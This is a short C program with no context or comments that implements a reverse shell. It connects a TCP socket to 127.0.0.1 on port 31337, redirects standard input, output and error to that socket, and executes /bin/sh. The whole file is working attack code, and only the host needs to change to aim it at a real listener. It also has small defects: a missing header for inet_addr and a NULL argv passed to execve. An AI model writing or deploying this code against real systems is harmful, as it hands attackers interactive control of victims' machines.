#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

  int sockfd;
  int port = 31337;
  char host[] = "127.0.0.1";
  struct sockaddr_in addr;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr(host);

  connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));

  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  execve("/bin/sh", NULL, NULL);
  return 0;
}
